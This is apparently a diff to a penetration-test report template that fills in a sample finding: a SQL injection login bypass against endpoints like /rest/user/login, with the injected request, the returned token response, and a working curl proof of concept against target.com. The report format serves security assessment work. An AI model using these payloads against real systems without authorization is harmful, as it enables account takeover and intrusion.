@@ -146,15 +146,36 @@ SQLi (bypass auth) -> Admin Access -> CMDi (RCE) -> Full Server Compromise>
 | CVSS v3.1 | <score> — <vector> |
 | OWASP | <category> |
 
-**Evidence:**
-<actual test script + actual server response>
+**Affected Endpoints** (list ALL paths where this vuln was confirmed):
+- `POST /rest/user/login` — param: email
+- `GET /rest/products/search?q=` — param: q
+- `POST /api/comments` — param: comment
+
+**Request Sent:**
+```http
+POST /rest/user/login HTTP/1.1
+Content-Type: application/json
+
+{"email":"' OR '1'='1' --","password":"x"}
+```
+
+**Server Response:**
+```json
+{"authentication":{"token":"eyJ...","bid":1}}
+```
+
+**Evidence:** <explain WHY this confirms the vulnerability>
 
 **Screenshot:** `<filename>.png`
 
-**PoC:**
-<working curl command with real cookies/values>
+**PoC (working curl — NO placeholders):**
+```bash
+curl -s -X POST https://target.com/rest/user/login \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"' --","password":"x"}'
+```
 
-**Impact:** <specific to THIS app>
+**Impact:** <what an attacker can do with this — be specific>
 **Remediation:** <specific fix with code example>
 
 ---
